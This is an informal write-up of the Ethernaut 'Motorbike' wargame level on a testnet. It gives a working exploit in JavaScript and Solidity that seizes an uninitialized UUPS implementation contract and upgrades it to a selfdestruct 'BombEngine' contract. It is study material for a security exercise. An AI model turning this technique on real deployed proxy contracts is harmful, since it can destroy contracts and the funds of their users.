## Motorbike

1. In this contract we have to destroy the engine to make it unusable.

2. I followed this resource `https://dev.to/nvn/ethernaut-hacks-level-25-motorbike-397g` which explains it very well and i even watched d-sqaured and i deployed a uups from openzapplin tutorial from their blog `https://forum.openzeppelin.com/t/uups-proxies-tutorial-solidity
javascript/7786`
   and many other resources, i will leave this medium article `https://medium.com/@appsbylamby/ethernaut-25-motorbikewalkthrough-3e1feeee6a4c` for complementary resource if needed.

3. We get the data stored at slot for implementation address
   `implAddr = await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')`
   we format data as address `implAddr = '0x' + implAddr.slice(-40)`

4. I will leave some explaination lines from the blog
   > Now, if we sent a transaction directly to initialize of Engine rather than going through proxy, the code will run in Engine's context rather than proxy's. That means the storage variables - initialized, initializing (inherited from Initializable), upgrader etc. will be read from Engine's storage slots. And these variables will most likely will contain their default values - false, false, 0x0 respectively because Engine was supposed to be only the logic layer, not storage.
   > And since initialized will be equal to false (default for bool) in context of Engine the initializer modifier on initialize method will pass!
   > Call the initialize at Engine's address i.e. at implAddr:
   > `initializeData = web3.eth.abi.encodeFunctionSignature("initialize()")` > `await web3.eth.sendTransaction({ from: player, to: implAddr, data: initializeData })`
5. paste from blog

   > Alright, invoking initialize method must've now set player as upgrader. Verify by:
   > `await web3.eth.call({from: player, to: implAddr, data: upgraderData}).then(v => '0x' + v.slice(-40).toLowerCase()) === player.toLowerCase()`

6. So, player is now eligible to upgrade the implementation contract now through upgradeToAndCall method. Let's create the following malicious contract - BombEngine in Remix:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

contract BombEngine {
    function explode() public {
        selfdestruct(address(0));
    }
}
```

7. After I did above steps i realized and remembered as of now evm does not have selfdestruct and i wonder if i will to solve this but then i copy pasted the steps and i am not explaining as they are straight forward so you can just go with them one by one

8. Actually these commands worked on goerli testnet where I am solving these

```javascript
bombAddr = "0x4aA37F91a9a02ba94F860309C882BDCAF84639fb";
explodeData = web3.eth.abi.encodeFunctionSignature("explode()");

upgradeSignature = {
  name: "upgradeToAndCall",
  type: "function",
  inputs: [
    {
      type: "address",
      name: "newImplementation",
    },
    {
      type: "bytes",
      name: "data",
    },
  ],
};

upgradeParams = [bombAddr, explodeData];

upgradeData = web3.eth.abi.encodeFunctionCall(upgradeSignature, upgradeParams);
```

`await web3.eth.sendTransaction({from: player, to: implAddr, data: upgradeData})`

9. success
